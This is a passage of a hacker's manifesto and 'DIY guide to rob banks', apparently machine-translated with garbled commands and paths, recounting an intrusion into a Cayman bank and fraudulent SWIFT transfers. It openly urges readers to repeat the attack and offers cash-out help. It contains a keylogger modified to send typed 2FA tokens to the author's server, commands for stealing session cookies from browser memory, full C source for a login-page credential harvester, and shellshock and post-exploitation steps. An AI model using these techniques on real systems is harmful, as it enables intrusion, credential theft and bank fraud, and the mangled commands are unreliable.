@@ -1,0 +1,1261 @@
+                _ _ _ ____ _ _ 
+               | | | | __ _ ___ | | __ | __) __ _ ___ | | _ | |
+               | | _ | | / _` | / __ | | / / | _ \ / _` | / __ | | / / |
+               | _ | (_ | | (__ | <| | _) | (_ | | (__ | <| _ |
+               | _ | | _ | \ __, _ | \ ___ | _ | \ _ \ | ____ / \ __, _ | \ ___ | _ | \ _ (_)
+
+                         A DIY guide to rob banks
+                        
+                        
+                                  ^ __ ^
+                                  (oo) \ _______
+                               ((__) \) \ / \
+                                _) / || ---- w |
+                               (.) / || ||
+                                ''
+                          By Subcowmandante Marcos
+                             
+
+                             
+                             
+                               I am a wild child
+                           Innocent, free, wild
+                             I have all ages
+                            My grandparents live in me
+
+                            I'm brother of the clouds
+                              And I only know how to share
+                            I know everything belongs to everyone
+                            that everything is alive in me
+
+                           My heart is a star
+                             I am a son of the earth
+                          I travel aboard my spirit
+                             Road to eternity
+
+
+This is my simple word that seeks to touch the hearts of simple people and
+humble, but also dignified and rebellious. This is my simple word to tell
+of my hacks, and to invite other people to hack with cheerful
+rebelliousness
+
+I hacked a bank. I did it to give a liquidity injection, but this time since
+below and the simple and humble people who resist and rebel against
+injustices worldwide. In other words: I robbed a bank and gave away the
+money. But it wasn't me alone who did it. The free software movement, the
+offensive powershell community, metasploit project and hacker community
+in general they are the ones that made this hack possible. The exploit.in community
+made it possible to convert the intrusion into a bank's computers into cash
+and bitcoin The Tor, Qubes and Whonix projects, together with the cryptographers and
+activists who defend privacy and anonymity, are my nahuales, is
+say, my protectors [1]. They accompany me every night and make it possible for me to stay in
+freedom.
+
+I did nothing complicated. I only saw the injustice in this world, I felt love
+for all beings, and I expressed that love in the best way I could, through
+tools that I can use. Hate does not move me to banks, nor to the rich, but
+a love for life, and the desire for a world where everyone can perform their
+potential and live a full life. I would like to explain a little how I see the world,
+so they can get an idea of ​​how I came to feel and act like that.
+And I also hope that this guide is a recipe that you can follow, combining the
+Same ingredients for baking the same cake. Who knows, there you are
+such powerful tools end up serving you also to express the
+Love they feel.
+
+
+                           We are all wild children
+                         innocent, free, wild
+
+                      We are all brothers of the trees
+                               children of the earth
+
+                   We just have to put in our hearts
+                             a burning star
+
+                    (song by Alberto Kuselman and ChamalÃº)
+
+
+The police are going to invest a chingo of resources to investigate me. They think the
+system works, or at least it will work once they catch all the
+"bad boys". I am nothing more than the product of a system that does not work.
+As long as there is injustice, exploitation, alienation, violence and
+ecological destruction, many more will come like me: an endless series of 
+people who will illegitimately reject the bad system responsible for this
+suffering. That badly done system is not going to compose arresting me. I am
+only one of the millions of seeds that Tupac planted 238 years ago in La
+Peace [2], and I hope that my actions and writings water the seed of rebellion
+In their hearts
+
+[1] https://es.wikipedia.org/wiki/Cadejo#Origen_y_significado_del_mito
+[2] It was before he was killed by the Spaniards, just one day as yesterday, that
+    He said that "they will only kill me, but tomorrow I will come back and be millions."
+
+ ____________________________________________
+<To be seen, we cover our faces>
+ --------------------------------------------
+         \
+          \ ^ __ ^
+            (oo) \ _______
+         ((__) \) \ / \
+          _) / || ---- w |
+         (.) / || ||
+          ''
+To make us listen, hackers sometimes have to cover our faces, because
+We are not interested in seeing our face but understanding our word. The
+mask can be from Guy Fawkes, Salvador DalÃ, from Fsociety, or in some cases
+The puppet of a crested toad. By affinity, this time I went to dig up
+a deceased to lend me his balaclava. I think then I should clarify that
+Sup Marcos is innocent of everything here because, in addition to being
+Dead, I didn't consult him. I hope your ghost, if you find out from a hammock
+Chiapaneca, know how to find goodness for, as they say there, "dismiss this
+deep fake "with the same gesture with which an inopportune insect moves away - that's fine
+It could be a beetle.
+
+Even so with the balaclava and the name change, many of those who support my
+actions are perhaps going to pay too much attention to my person. With its own
+autonomy shattered for a lifetime of domination, they will be looking for a
+Leader to follow, or a hero to save them. But behind the balaclava only
+I am a girl. We are all wild children. We just have to place a star
+in chamas em nossos coraÃ§Ãµes.
+
+
+
+- [1 - Why expropriate] ---------------------------------------- -------------
+
+Capitalism is a system in which a minority has come to appropriate 
+a vast majority of the world's resources through war, theft and 
+the exploitation. By snatching the commons [1], they forced those below to
+being under the control of that minority that owns everything. It is a system
+fundamentally incompatible with freedom, equality, democracy and 
+Sum QamaÃ ± a (Good Living). It may sound ridiculous to those of us who have grown up in a
+propaganda machinery that taught us that capitalism is freedom, but in
+Truly, what I am saying is not a new or controversial idea [2]. The founders
+from the United States of America knew that they had to choose between creating a
+capitalist society, or a free and democratic one. Madison recognized that "the
+man who possesses wealth, he who lies down on his sofa or rolls in his carriage,
+cannot judge the wishes or feelings of the day laborer. "But to protect himself
+in front of the "spirit of equalization" of the landless day laborers, it seemed to him
+that only landowners should vote, and that the government had to
+serve to "protect the opulent minority against the great majority." John
+Jay was more to the point and said: "Those who own the country should
+rule it. "
+
+ ____________________________________________________
+/ There is no such thing as green capitalism. \
+| Let's make capitalism history before we |
+\ become history. /
+ -------------------------------------------------- -
+ \ / \ ___ / \
+  \ // \ / \ / \\
+     ((OO))
+      \\ / \ //
+       \ / | | \ /
+        | | | | Evgeny, the great ignored elephant, doesn't understand why everyone
+        | | | | They pretend not to see you on the panels about climate change, so
+        | or | that here I give you a chance to say your lines.
+        | | | |
+        | m | | m |  
+
+   
+In the same way that bell hooks [3] argues that the rejection of culture
+Patriarchal domination is an act in defense of the male's own interest (already
+that emotionally mutilates them and prevents them from feeling love and connection in a way
+full), I believe that the culture of domination of capitalism has an effect
+similar about the rich, and that they could have fuller and more satisfying lives
+if they rejected the class system from which they believe they benefit. For many,
+class privilege equals a childhood of emotional neglect, followed
+of a life of superficial social interactions and meaningless work. May
+that deep down they know that they can only genuinely connect with people
+when they work with them as their peers, and not when they put them at their service.
+They may know that sharing their material wealth is the best they can do. 
+with her. You may also know that the significant experiences, the
+connections and relationships that count are not the ones that come from 
+mercantile interactions, but precisely to reject the logic of the market 
+and give without expecting anything in return. They may know that everything they need to
+escape from his prison and really live is to let go, give up control, and 
+Take a leap of faith. But most lack courage.
+
+Then it would be naive of us to direct our efforts to try to 
+produce some kind of spiritual awakening in the rich [4]. As Assata says
+Shakur: "No one in the world, no one in history, has ever achieved his 
+freedom appealing to the moral sense of its oppressors. "Actually, when 
+rich people distribute their money, they almost always do it in a way that reinforces the
+system that to begin with allowed them to amass their enormous and illegitimate wealth
+[5]. And change is unlikely to come through a political process;
+As Lucy Parsons says: "Let us never be fooled by the rich
+they are going to let them vote to take away their wealth. "Colin Jenkins justifies the
+expropriation with these words [6]:
+
+    Make no mistake, expropriation is not theft. It is not the confiscation of
+    money earned "with the sweat of the forehead." It is not property theft
+    private It is, rather, the recovery of huge amounts of land and
+    wealth that has been forged with stolen natural resources, slavery 
+    human, forced labor force kneaded in hundreds of years for a 
+    small minority. This wealth ... is illegitimate, both for moral purposes and for
+    as for the exploitation mechanisms that have been used to create it.
+
+For Colin, the first step is that "we have to free ourselves from our bonds 
+mental (believing that wealth and private property have been earned by 
+who monopolize them; and that, therefore, they should be something to respect,
+reverence, and even something to pursue), open our minds, study and 
+learn from history, and recognize this illegitimacy together. "Here I leave 
+some books that have helped me with this [7] [8] [9] [10] [11].
+
+According to Barack Obama, economic inequality is "the challenge that defines our
+time. "Computer hacking is a powerful tool to combat
+economic inequality The former director of the NSA, Keith Alexander, agrees
+and says that hacking is responsible for "the greatest transfer of wealth of the
+history".
+
+ _________________________
+/ The story is ours \
+And they do it hackers! /
+ -------------------------
+         \
+          \ ^ __ ^
+            (oo) \ _______
+         ((__) \) \ / \
+          _) / || ---- w |
+         (.) / || ||
+          ''
+Allen present, now and forever!
+
+[1] https://sursiendo.com/docs/Pensar_desde_los_comunes_web.pdf
+[2] https://chomsky.info/commongood02/
+[3] The Will to Change: Men, Masculinity, and Love
+[4] his own religion is already very clear about it:
+    https://dailyverses.net/es/materialismo
+[5] https://elpulso.hn/la-filantropia-en-los-tiempos-del-capitalismo/
+[6] http://www.hamptoninstitution.org/expropriation-or-bust.html
+[7] Manifesto for a Democratic Civilization. Volume 1, Civilization: The Era
+    of the Masked Gods and the Covered Kings
+[8] Calibrate and the Witch
+[9] In debt: An alternative history of the economy
+[10] The other story of the United States
+[11] The open veins of Latin America
+
+
+
+                    _________________________________
+                   <Our weapon is our keyboard>
+                    ---------------------------------
+                              \
+                               \ ^ __ ^
+                                 (oo) \ _______
+                              ((__) \) \ / \
+                               _) / || ---- w |
+                              (.) / || ||
+                               `` ^^ ^^
+
+- [2 - Introduction] ------------------------------------------- ---------------
+
+This guide explains how I hacked the Cayman Bank and Trust Company 
+(Isle of Man). Why am I posting this, almost four years later?
+
+1) To show what is possible
+
+Hackers working for social change have limited themselves to developing 
+security and privacy tools, DDoS, perform defaults and leaks. 
+Wherever you go there are radical projects for a complete social change 
+precarious state, and it would be a lot what they could do with some money 
+expropriated At least for the working class, bank robbery is something
+socially accepted, and those who do are seen as people's heroes. In
+the digital age, robbing a bank is a non-violent, less risky act, and the 
+Reward is greater than ever. So why are only hackers from
+black hat that they do for their personal benefit, and never 
+hacktivists to finance radical projects? Maybe they don't think they are
+able to do it The big bank hacks come out on the news every
+as much as the hacking to the Bank of Bangladesh [1], which was attributed to Korea's
+North, or bank hacks attributed to the Carbanak group [2], which they describe
+as a very large and well organized group of Russian hackers, with different
+members who would be specialized in different tasks. And, well it's not so
+complicated.
+
+It is because of our collective belief that the financial system is unquestionable
+that we exercise control over ourselves, and maintain the class system
+without those above having to do anything [3]. Be able to see how vulnerable and
+fragile is actually the financial system helps us break that hallucination
+collective That is why banks have a strong incentive not to report
+hacks, and to exaggerate how sophisticated the attackers are. None of the
+financial hacks that I did, or of which I have known, has never been reported.
+This is going to be the first, and not because the bank would like to, but because I
+I decided to publish it.
+
+As you are about to learn in this home guide, hack a bank and
+transferring money through the SWIFT network does not require the support of any 
+government, nor of a large and specialized group. It is something totally possible
+being a mere amateur and a lot of hacker, with just tools
+public and basic knowledge of how to write a script.
+
+[1] https://elpais.com/economia/2016/03/17/actualidad/1458200294_374693.html
+[2] https://securelist.lat/el-gran-robo-de-banco-el-apt-carbanak/67508/
+[3] https://es.wikipedia.org/wiki/Hegemon%C3%ADa_cultural
+
+2) Help withdraw cash
+
+Many of those who read this already have, or with a little study are going to be 
+able to acquire the necessary skills to carry out a hacking 
+like this. However, many will find that they lack the
+criminal connections necessary to get the handles in condition. In Myself
+case, this was the first bank that hacked, and at that time I only had a few
+few and mediocre accounts prepared to withdraw cash (known
+as bank drops), so it was only a few hundred thousand who
+I was able to withdraw in total, when it is normal to get millions. Now instead
+that I have the knowledge and connections to get cash more seriously, from
+so if they are hacking a bank but need help to convert
+that in real money, and they want to use that wool to finance projects
+radical social, contact me.
+
+3) Collaborate
+
+It is possible to hack banks as an amateur who works alone, but the 
+It is clear that, in general, it is not as easy as I paint it here. I was lucky with
+This bank for several reasons:
+
+1) It was a small bank, so it took me much less time to get to  
+   Understand how everything worked.
+
+2) They had no procedure to check the sent swift messages. 
+   Many banks have one, and you need to write code to hide your 
+   transfers from your monitoring system.
+
+3) They only used password authentication to access the application with the 
+   that connected to the SWIFT network. Most banks now use RSA
+   SecurID, or some form of 2FA. You can skip this by typing code to
+   receive an alert when your token enters, and so you can use it before
+   expire It's simpler than it seems: I've used Get-Keystrokes [1],
+   modifying it so that instead of storing the pressed keys, a
+   GET request to my server every time it is detected that they have introduced a
+   Username. This request adds the username to the url and,
+   as they type the token, several GETs are made with the token digits
+   concatenated to the url. On my side I leave this running in the meantime:
+
+   ssh yo @ my_secret_server 'tail -f / var / log / apache2 / access_log'
+    | while read i; I miss $ i; aplay alarm.wav &> / dev / null; done
+
+   If it is a web application, you can skip the 2FA by stealing the cookie 
+   after they have authenticated. I am not an APT with a team of coders
+   that can make me custom tools. I am a simple person who lives
+   of what terminal [2] gives, so what I use is:
+
+   procdump64 / accepteula -r -ma PID_del_browser
+   strings64 / accepteula * .dmp | findstr PHPSESSID 2> nul
+
+   or going through findstr rather than strings, which makes it much more
+   Quick:
+   
+   findstr PHPSESSID * .dmp> tmp
+   strings64 / accepteula tmp | findstr PHPSESSID 2> nul
+
+   Another way to skip it is to access your session with a hidden VNC (hvnc)
+   after they have authenticated, or with a little creativity too 
+   you could focus on another part of your process instead of sending messages 
+   SWIFT directly.
+
+I think that if I collaborated with other experienced bank hackers we could 
+make hundreds of banks like Carnabak, instead of doing one of those 
+in both on my own. So if you have experience with similar hacks and
+You want to collaborate, contact me. You will find my email and my PGP key at the end of
+the previous guide [3].
+
+[1] https://github.com/PowerShellMafia/PowerSploit/blob/master/
+    Exfiltration / Get-Keystrokes.ps1
+[2] https://lolbas-project.github.io/
+[3] https://www.exploit-db.com/papers/41914
+
+ ________________________________________
+/ If robbing a bank would change things, \
+\ would make it illegal /
+ ----------------------------------------
+         \
+          \ ^ __ ^
+            (oo) \ _______
+         ((__) \) \ / \
+          _) / || ---- w |
+         (.) / || ||
+          ''
+
+- [3 - Be careful out there] ---------------------------------------- ------
+
+It is important to take some simple precautions. I'm going to refer to this
+same section of my last guide [1], since apparently it works just fine
+[two]. All I have to add is that, in Trump's words, "Unless
+catch hackers in fraganti, it is difficult to determine who is that
+I was hacking, "so the police are getting more and more 
+creative [3] [4] in their attempts to grab criminals on the spot (when 
+your encrypted hard drives are unlocked). So it would be nice if by
+example you carry a certain bluetooth device and configure your
+computer to shut down when it moves beyond a certain range, or
+when an accelerometer detects movement, or something like that.
+
+You may write long articles detailing your actions and your ideology not 
+it is the safest thing in the world (ups!), but at times I feel I had to
+do what.
+
+                        If I didn't believe in who listens to me
+                        If I didn't believe in what hurts
+                        If I didn't believe in what's left
+                        If I didn't believe in what I fought
+                        What a thing ...
+                        What was the club without a quarry?
+
+[1] https://www.exploit-db.com/papers/41914
+[2] https://www.wifi-libre.com/topic-1268-italia-se-rinde-y-deja-de-buscar-a-
+    phineas-fisher.html
+[3] https://www.wired.com/2015/05/silk-road-2/
+[4] https://motherboard.vice.com/en_us/article/59wwxx/fbi-airs-alexandre-cazes-
+    alphabay-arrest-video
+
+
+    , - \ __ 
+    | f- "Y \ ____________________
+    \ () 7L / | Be gay! |
+     cgD | Do the crime! | __ _
+     | \ (---------------------. 'Y'>,
+      \ \ \ / _ _ \
+       \\\ \) (_) (_) (|}
+        \\\ {4A} /
+         \\\ \ uLuJJ / \ l
+          \\\ | 3 p) /
+           \\\ ___ __________ / nnm_n //
+           c7 ___-__, __-) \, __) (". \ _> - <_ / D
+                      // V \ _ "-._.__ G G_c __.-__ <" / (\
+                             <"-._> __-, G _.___) \ \ 7 \
+                            ("-.__. | \" <.__.- ") \ \
+                            | "-.__" \ | "-.__.-". \ \ \
+                            ("-.__" ". \" -.__.- ". | \ _ \
+                            \ "-.__" "|! |" -.__.- ".) \ \
+                             "-.__" "\ _ |" -.__.- "./ \ l
+                              ".__" ""> G> -.__.- "> .--, _
+                                  "" G
+
+        Many blame queer people for the decline of this society;
+                         we are proud of it
+                Some believe we want to reduce to ashes
+                     this civilization and its moral fabric;
+                      They couldn't be more right
+    They often describe us as depravadxs, decadent and revoltosxs
+                    But oh! They haven't seen anything yet
+
+https://theanarchistlibrary.org/library/mary-nardini-gang-be-gay-do-crime
+
+
+- [4 - Get access] ------------------------------------------ ------------
+
+In another place [1] I was talking about the main routes to get
+Initial access to a company's network during a targeted attack. Nevertheless,
+This was not a targeted attack. I didn't set out to hack a specific bank, what
+I wanted to hack any bank, which ends up being a lot of work
+more simple This type of nonspecific approach was popularized by Lulzsec and
+Anonymous [2]. As part of [1], I prepared an exploit and tools for
+post-exploitation for a popular VPN device. Then I started scanning the
+entire internet with zmap [3] and zgrab to identify other devices
+vulnerable I had the scanner save the vulnerable IPs, along with the
+"common name" and "alt names" of the device's SSL certificate, the names
+Windows domain of the device, and reverse DNS lookup for the IP. You
+I did a grep to the result in search of the word "bank", and there was enough to
+choose, but the truth is that the word "Cayman" attracted me, and that is how I came
+to stay with this one.
+
+[1] https://www.exploit-db.com/papers/41914
+[2] https://web.archive.org/web/20190329001614/http://infosuck.org/0x0098.png
+[3] https://github.com/zmap/zmap
+
+
+---- [4.1 - The Exploit] ---------------------------------------- ----------------
+
+When I published my last DIY guide [1] I did not reveal the exploit details of
+sonicwall that he had used to hack Hacking Team, since it was very useful for
+other hacks, like this one, and I still hadn't finished having fun with him.
+Determined then to hack Hacking Team, I spent weeks doing engineering
+Reverse to his sonicwall ssl-vpn model, and I even managed to find
+several memory corruption vulnerabilities more or less difficult to
+explode, before I realized that the device was easily exploitable
+with shellshock [2]. When shellshock came out, many sonicwall devices were
+vulnerable, only with a request to cgi-bin / welcome, and a payload on the
+user-agent Dell released a security update and an advisory for these
+versions. The version used by Hacking Team and this bank had the version of
+bash vulnerable, but cgi requests didn't fire the shellshock except for
+the requests to a shell script, and there was just one accessible:
+cgi-bin / jarrewrite.sh. This seems to have escaped Dell's in his note,
+since they never released a security update or an advisory for that
+sonicwall version. And, kindly, Dell had done twounix setuid root,
+leaving an easy device to root.
+
+In my last guide many read that I spent weeks researching a device 
+until they found an exploit, and they assumed that meant that I was some type
+of Ã © lite hacker. The reality, that is, the fact that it took me two weeks
+realize that it was trivially exploitable with shellshock, maybe less
+Flattering to me, but I think it's also more inspiring. Show that
+You can really do this for yourself. You don't need to be a genius, I
+I certainly am not. Actually my work against Hacking Team started a
+year before. When I discovered Hacking Team and the Gamma Group in the
+CitizenLab research [3] [4], I decided to explore a bit and see if I could
+find something. I didn't get anywhere with Hacking Team, but I was lucky with
+Gamma Group, and I was able to hack your customer service portal with sql injection
+Basic and file upload vulnerabilities [5] [6]. However, despite
+that its support server gave me a pivot towards the internal Gamma network
+Group, I was unable to penetrate beyond the company. from this one on
+experience with the Gamma Group and other hacks, I realized that I was
+really limited by my lack of knowledge about privilege escalation and
+lateral movement in windows domains, active directory and windows in general.
+So I studied and practiced (see section 11), until I felt I was ready
+to pay a visit to Hacking Team almost a year later. The practice
+paid off, and this time I was able to make a complete commitment to the
+company [7]. Before I realized that I could go in with shellshock, I was
+willing to spend happy whole months of life studying development of
+exploits and writing a reliable exploit for one of the vulnerabilities of
+memory corruption he had found. I only knew that Hacking Team
+I needed to be exposed, and it would take me as much time as necessary and
+I would learn what I had to learn to get it. To perform these
+Hacks you don't need to be bright. You don't even need great knowledge
+technical. You just need dedication, and believe in yourself.
+
+[1] https://www.exploit-db.com/papers/41914
+[2] https://es.wikipedia.org/wiki/Shellshock_(error_de_software)
+[3] https://citizenlab.ca/tag/hacking-team/
+[4] https://citizenlab.ca/tag/finfisher/
+[5] https://theintercept.com/2014/08/07/leaked-files-german-spy-company-helped-
+    bahrain-track-arab-spring-protesters /
+[6] https://www.exploit-db.com/papers/41913
+[7] https://web.archive.org/web/20150706095436/https://twitter.com/hackingteam
+
+
+---- [4.2 - The Backdoor] ---------------------------------------- ---------------
+
+Part of the backdoor I prepared for the Hacking Team (see [1], section 6) was a 
+Simple wrapper on the login page to capture passwords:
+
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main ()
+{
+        char buf [2048];
+        int nread, pfile;
+
+        / * pull the log if we send a special cookie * /
+        char * cookies = getenv ("HTTP_COOKIE");
+        if (cookies && strstr (cookies, "our private password")) {
+                write (1, "Content-type: text / plain \ n \ n", 26);
+                pfile = open ("/ tmp / .pfile", O_RDONLY);
+                while ((nread = read (pfile, buf, sizeof (buf)))> 0)
+                        write (1, buf, nread);
+                exit (0);
+        }
+
+        / * the principal stores the POST data and sends it to the child,
+           what is the real login program * /
+        int fd [2];
+        pipe (fd);
+        pfile = open ("/ tmp / .pfile", O_APPEND | O_CREAT | O_WRONLY, 0600);
+        if (fork ()) {
+                close (fd [0]);
+
+                while ((nread = read (0, buf, sizeof (buf)))> 0) {
+                        write (fd [1], buf, nread);
+                        write (pfile, buf, nread);
+                }
+
+                write (pfile, "\ n", 1);
+                close (fd [1]);
+                close (pfile);
+                wait (NULL);
+        } else {
+                close (fd [1]);
+                dup2 (fd [0], 0);
+                close (fd [0]);
+                execl ("/ usr / src / EasyAccess / www / cgi-bin / .userLogin", 
+                      "userLogin", NULL);
+        }
+}
+
+In the case of Hacking Team, they logged on to the VPN with single-use passwords,
+so the VPN gave me access only to the network, and from there it took me
+An extra effort to get domain admin on your network. In the other guide I wrote
+on lateral passes and privilege escalation in windows domains [1]. In this
+However, it was the same Windows domain passwords that were
+they used to authenticate against the VPN, so I could get a good
+User passwords, including domain admin. Now I had total
+access to your network, but usually this is the easy part. The most complicated part
+is to understand how they operate and how to get the gun.
+
+[1] https://www.exploit-db.com/papers/41914
+
+
+---- [4.3 - Fun facts] ---------------------------------------- ------------
+
+Following the investigation they did about the hacking, I found it interesting
+see that, by the same time I did it, the bank could have been
+committed by someone else through a targeted phishing email [1].
+As the old saying goes, "give a person an exploit and they will have access by a
+day, teach Phishear and he will have access all his life "[2]. The fact that
+someone else, by chance and at the same time as me, put on this bank
+small in sight (they registered a domain similar to the real domain of the bank
+to be able to send phishing from there) suggests that bank hacks
+They occur much more frequently than is known.
+
+A fun suggestion so you can follow your research 
+hacking is having a backup access, one that you won't touch unless 
+lose normal access I have a simple script that expects commands a
+once a day, or less, only to maintain long-term access in the case of 
+that block my regular access. Then I had an empire powershell [3]
+calling home more frequently to a different IP, and used empire to 
+launch meterpreter [4] against a third IP, where he performed most of 
+my job. When PWC started investigating the hacking, they found my use of
+empire and meterpreter and cleaned those computers and blocked those IPs, but 
+They did not detect my backup access. PWC had placed devices
+network monitoring, to analyze the traffic and see if there was still 
+Infected computers, so I didn't want to connect much to your network. Only
+I launched mimikatz once to get the new passwords, and from there 
+I was able to continue your research by reading your emails in the outlook web access.
+
+[1] page 47, Project Pallid Nutmeg.pdf, in torrent
+[2] https://twitter.com/thegrugq/status/563964286783877121
+[3] https://github.com/EmpireProject/Empire
+[4] https://github.com/rapid7/metasploit-framework
+
+
+- [5 - Understand Banking Operations] ------------------------------------
+
+To understand how the bank operated, and how I could get money, I followed the 
+techniques that I summarized in [1], in section "13.3 - Internal Recognition". 
+I downloaded a list of all file names, I did a grep in search 
+of words like "SWIFT" and "transfer", and I downloaded and read all the 
+Files with interesting names. I also looked for emails from employees, but from
+by far the most useful technique was to use keyloggers and screenshots to
+observe how the bank employees worked. I didn't know it by then, but
+For this windows brings a very good monitoring tool [2]. How I know
+described in the technique no. 5 of section 13.3 in [1], I captured the
+keys pressed throughout the domain (including window titles), I made a
+grep in search of SWIFT, and I found some employees opening 'SWIFT Access
+Service Bureau - Logon '. For those employees, I ran meterpreter as in [3], and
+I used the post / windows / gather / screen_spy module to take screenshots
+every 5 seconds, to see how they worked. They were using an app
+remote citrix of the bottomline company [4] to access the SWIFT network, where
+each payment message SWIFT MT103 had to pass through three employees: one
+to "create" the message, one to "verify it", and another to "authorize it". How
+I already had all his credentials thanks to the keylogger, I could perform with
+Ease the three steps myself. And from what I knew after seeing them
+work, they didn't check the sent SWIFT messages, so you should have
+enough time to get the money from my bank drops before the bank
+He would realize and try to reverse the transfers.
+
+[1] https://www.exploit-db.com/papers/41914
+[2] https://cyberarms.wordpress.com/2016/02/13/using-problem-steps-recorder-psr-
+    remotely-with-metasploit /
+[3] https://www.trustedsec.com/blog/no_psexec_needed/
+[4] https://www.bottomline.com/uk/products/bottomline-swift-access-services
+
+ _________________________________________
+/ Who steals a thief, is one hundred years old \
+\ sorry. /
+ -----------------------------------------
+         \
+          \ ^ __ ^
+            (oo) \ _______
+         ((__) \) \ / \
+          _) / || ---- w |
+         (.) / || ||
+          ''
+
+- [6 - Send money] ----------------------------------------- -------------
+
+I didn't have much idea what I was doing, so I was discovering it 
+by the way. Somehow, the first transfers I sent came out
+good. The next day, I screwed up by sending a transfer to Mexico that put
+End to my fun. This bank sent its international transfers
+through your correspondent account in Natwest. I had seen the bill
+correspondent for transfers in pounds sterling (GBP) appeared as
+NWBKGB2LGPL, while for the others it was NWBKGB2LXXX. The transference
+Mexican was in GBP, so I assumed I had to put NWBKGB2LGPL as
+correspondent. If I had prepared it better I would have known that the GPL instead of
+XXX indicated that the payment would be sent through the Fast Payments Service of the
+United Kingdom, rather than as an international transfer, which obviously
+Well, it won't work when you're trying to send money to Mexico. So
+The bank received an error message. The same day I also tried to send a
+Payment of £ 200k to UK using NWBKGB2LGPL, which was not made because 200k exceeded the
+shipping limit through fast payments, and you would have had to use NWBKGB2LXXX in
+time. They also received an error message for this. They read the messages, what
+They researched, and found the rest of my transfers.
+
+
+- [7 - The button] ------------------------------------------ --------------------
+
+From what I write, they will already have a complete idea of ​​what my ideals are.
+What things I give my support. But I don't want to see anyone in legal trouble
+for receiving expropriated funds, so not a word more than where 
+It was the wool. I know journalists are probably going to want to put some
+number on how many dollars were distributed in this hack and others
+similar, but I prefer not to encourage our perverse habit of measuring 
+shares just for their economic value. Any action is admirable if
+It comes from love and not from the ego. Unfortunately those above, the rich and
+powerful, public figures, businessmen, people in positions
+"important", those that our society respects and values ​​most, those have
+placed where it is based on acting more from the ego than from love. Is in
+the simple, humble and "invisible" people on whom we should look now
+who should we admire.
+
+
+- [8 - Cryptocurrencies] ------------------------------------------- --------------
+
+Redistribute expropriated money to Chilean projects that seek social change 
+positive would be easier and safer if those projects accepted donations 
+Anonymous via cryptocurrencies like Monero, Zcash, or at least Bitcoin. It is understood
+that many of these projects have an aversion to cryptocurrencies, since 
+they look more like some strange hypercapitalist dystopia than the economy 
+social with which we dream. I share their skepticism, but I think they turn out
+Useful to allow donations and anonymous transactions, by limiting the
+Government surveillance and control. Same as cash, whose use many
+countries are trying to limit for the same reason.
+
+
+- [9 - Powershell] ------------------------------------------- -----------------
+
+In this operation, as in [1], I made a lot of use of powershell. By
+so, powershell was super cool, you could do almost anything that
+you would like, without antivirus detection and with very little forensic footprint. It happens
+that with the introduction of AMSI [2] the offensive powershell is retiring.
+Today the offensive C # is what is on the rise, with tools like
+[3] [4] [5] [6]. AMSI is going to reach .NET for 4.8, so to the tools in
+C # probably still have a couple of years left before they become outdated.
+And then we'll use C or C ++ again, or maybe Delphi gets back on
+fashion. The specific tools and techniques change every few years, but in
+the bottom line is not so much what changes, today hacking is essentially still the
+misma cosa que era en los 90s. De hecho todos los scripts de powershell
+empleados en esta guÃ­a y en la anterior [1] siguen siendo perfectamente usables
+hoy dÃ­a, tras una pequeÃ±a ofuscaciÃ³n de tu propia cosecha.
+
+[1] https://www.exploit-db.com/papers/41914
+[2] https://medium.com/@byte_St0rm/
+    adventures-in-the-wonderful-world-of-amsi-25d235eb749c
+[3] https://cobbr.io/SharpSploit.html
+[4] https://github.com/tevora-threat/SharpView
+[5] https://www.harmj0y.net/blog/redteaming/ghostpack/
+[6] https://rastamouse.me/2019/08/covenant-donut-tikitorch/
+
+ ___________________________
+/   Fo Sostyn, Fo Ordaag    \
+\ Financial Sector Fuck Off /
+ ---------------------------
+         \
+          \ ^__^
+            (oo)\_______
+         (  (__)\       )\/\
+          _) /  ||----w |
+         (.)/   ||     ||
+          `'
+
+--[ 10 - Torrent ]--------------------------------------------------------------
+
+      Privacidad para los dÃ©biles, transparencia para los poderosos.
+
+La banca offshore provee de privacidad frente a su propio gobierno a los 
+ejecutivos, a los polÃ­ticos y a los millonarios. Exponerles puede sonar
+hipÃ³crita por mi parte, dado que por lo general estoy a favor de la privacidad y
+en contra de la vigilancia gubernamental. Pero la ley ya estaba escrita por y
+para los ricos: protege su sistema de explotaciÃ³n, con algunos lÃ­mites (como los
+impuestos) para que la sociedad pueda funcionar y el sistema no colapse bajo el
+peso de su propia avaricia. AsÃ­ que no, no es lo mismo la privacidad para los
+poderosos, cuando les permite evadir los limites de un sistema de por sÃ­
+diseÃ±ado para darles privilegios; y la privacidad para los dÃ©biles, a quienes
+protege de un sistema concebido para explotarles.
+
+Incluso a periodistas con la mejor de las intenciones les resulta imposible
+estudiar una cantidad tan ingente de material y saber quÃ© va a resultar
+relevante para la gente en diferentes partes del mundo. Cuando filtrÃ© los
+archivos de Hacking Team, entreguÃ© a The Intercept una copia de los correos
+electrÃ³nicos con un mes de antelaciÃ³n. Encontraron un par de los 0days que
+Hacking Team estaba usando, los reportaron previamente a MS y Adobe y publicaron
+unas cuantas historias una vez que la filtraciÃ³n se hizo pÃºblica. No hay punto
+de comparaciÃ³n con la enorme cantidad de artÃ­culos e investigaciÃ³n que vino tras
+la filtraciÃ³n completa al pÃºblico. ViÃ©ndolo asÃ­, y considerando tambiÃ©n la (no) 
+publicaciÃ³n editorializada [1] de los papeles de panamÃ¡, pienso que una
+filtraciÃ³n pÃºblica y completa de este material es la elecciÃ³n correcta.
+
+[1] https://www.craigmurray.org.uk/archives/2016/04/corporate-media-gatekeepers-
+    protect-western-1-from-panama-leak/
+
+Los psicÃ³logos hallaron que los que estÃ¡n mÃ¡s abajo en las jerarquÃ­as tienden a
+comprender y a empatizar con aquellos en la cima, pero que lo contrario es menos
+comÃºn. Esto explica por quÃ©, en este mundo sexista, muchos hombres bromean sobre
+su imposibilidad de entender a las mujeres, como si se tratara de un misterio
+irresoluble. Explica por quÃ© los ricos, si es que se paran a pensar en quienes
+viven en la pobreza, dan unos consejos y unas "soluciones" tan ajenas a la
+realidad que dan ganas de reÃ­r. Explica por quÃ© reverenciamos a los ejecutivos
+como valientes que asumen riesgos. Â¿QuÃ© es lo que arriesgan, mÃ¡s allÃ¡ de su
+privilegio? Si todos sus emprendimientos fracasan, tendrÃ¡n que vivir y trabajar
+como el resto de nosotras. TambiÃ©n explica por quÃ© serÃ¡n muchos los que acusen
+de irresponsable y peligrosa a esta filtraciÃ³n sin tachaduras. Sienten el
+"peligro" sobre un banco offshore y sus clientes de forma mucho mÃ¡s intensa de
+lo que sienten la miseria de aquellos desposeÃ­dos por este sistema injusto y
